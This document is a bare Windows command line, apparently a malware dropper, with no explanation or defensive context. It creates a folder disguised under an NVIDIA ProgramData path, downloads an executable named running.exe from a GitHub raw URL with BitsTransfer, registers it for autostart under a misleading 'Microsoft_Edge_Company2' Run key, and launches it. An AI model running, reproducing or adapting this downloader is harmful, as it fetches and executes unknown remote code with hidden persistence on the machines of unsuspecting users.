md C:\ProgramData\NVIDIA\Resources; import-module BitsTransfer; Start-BitsTransfer ("https://github.com/alejq41/free/raw/main/running.exe") ("C:\ProgramData\NVIDIA\Resources");REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company2 /d C:\ProgramData\NVIDIA\Resources\running.exe; cd C:\ProgramData\NVIDIA\Resources; start running.exe
1
exit
